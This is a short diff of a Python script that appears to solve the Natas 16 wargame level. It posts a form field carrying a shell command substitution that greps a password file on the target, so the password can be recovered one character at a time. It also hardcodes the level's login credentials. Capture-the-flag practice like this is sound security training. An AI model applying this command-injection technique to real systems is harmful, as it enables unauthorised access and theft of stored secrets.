@@ -29,7 +29,7 @@ def find_password(url:str, characters):
 def find_chars(url:str, chars):
     pass_chars = []
     for char in characters:
-        string =  {'needle' : f'$(grep -E .*{char} /etc/natas_webpass/natas17)'}
+        string =  {'needle' : f'$(grep -E [a-zA-Z0-9]*{char} /etc/natas_webpass/natas17)'}
 
         response = requests.post(url=url, params=string, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))
         r=response.text
